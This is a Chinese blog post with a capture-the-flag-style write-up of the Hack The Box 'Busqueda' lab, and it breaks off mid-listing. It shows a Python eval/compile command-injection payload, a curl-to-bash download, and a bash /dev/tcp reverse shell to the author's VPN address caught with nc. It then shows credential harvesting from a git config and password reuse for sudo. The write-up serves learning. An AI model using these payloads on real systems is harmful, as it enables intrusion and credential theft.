<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>hack the box |  小张之栈</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-hack-the-box"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
  
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  hack the box
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/18/hack-the-box/" class="article-date">
  <time datetime="2023-06-18T00:11:37.000Z" itemprop="datePublished">2023-06-18</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">22.8k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">123 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><p>下载htb的openvpn文件后，openvpn 文件</p>
<p>目的是获取user.txt和root.txt</p>
<h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
<p>ping一遍，能ping通</p>
<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>

<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
<p>火狐直接访问，访问不了</p>
<p>在hosts文件添加域名</p>
<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
<p>选了个google，查找内容为123</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
<p>很明显，post。</p>
<p>抓包试试，加个单引号不显示内容</p>
<p>sqlmap一下，没有注入点。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
<p>点击后，发现如下东西：</p>
<blockquote>
<p>Custom Engine</p>
<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a target="_blank" rel="noopener" href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a target="_blank" rel="noopener" href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
<p>Searchor CLI Quick Start</p>
<p>$ searchor Google “Hello World!” –copy</p>
</blockquote>
<p>这是调用引擎库去获取数据吧。</p>
<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
<blockquote>
<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
</blockquote>
<p>在bp上这样构造：</p>
<blockquote>
<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
</blockquote>
<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
<p>效果是这样的，</p>
<blockquote>
<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
</blockquote>
<p>相当于执行了参数为:</p>
<p><strong>‘</strong>123’ </p>
<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
<p>和&#39;‘</p>
<p>repeat结果里是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那其实ls可以改为 cat app.py，出现一串代码</p>
<p>shift+ctrl+u后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
<p>(不明觉厉o(￣▽￣)ｄ )</p>
<p>。。。然后捏，我没监听到东西。</p>
<p>可能<strong>是因为kali有防火墙</strong></p>
<p><code>sudo systemctl stop ufw</code></p>
<p><code>sudo systemctl disable ufw</code></p>
<p>将防火墙禁用，重新发包即可。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
<p>nc监听成功。</p>
<p>然后在nc窗口下</p>
<p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>（后面有，先放一边）。</p>
<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>

<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-l长格式信息,-a 所有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>

<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下config和logs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>

<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
<p>关注下这串代码：</p>
<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
<p>尝试下cody后的东西作为密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#x76;&#99;&#x40;&#49;&#48;&#x2e;&#x31;&#x30;&#x2e;&#49;&#x31;&#x2e;&#x32;&#48;&#56;">&#115;&#x76;&#99;&#x40;&#49;&#48;&#x2e;&#x31;&#x30;&#x2e;&#49;&#x31;&#x2e;&#x32;&#48;&#56;</a>，ssh连接即可。</p>
<h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
<p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>之后的操作便是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ls 有user.txt</span><br><span class="line"></span><br><span class="line">cd /</span><br><span class="line"></span><br><span class="line">ls   有etc文件夹</span><br><span class="line"></span><br><span class="line">cd etc</span><br><span class="line"></span><br><span class="line">ls ，看到了有apache2文件夹</span><br><span class="line"></span><br><span class="line">cd apache2</span><br><span class="line">svc@busqueda:/etc/apache2$ ls</span><br><span class="line">apache2.conf    conf-enabled  magic           mods-enabled  sites-available</span><br><span class="line">conf-available  envvars       mods-available  ports.conf    sites-enabled</span><br><span class="line">svc@busqueda:/etc/apache2$ cat  sites-available</span><br><span class="line"></span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -a</span><br><span class="line">.  ..  000-default.conf  default-ssl.conf</span><br><span 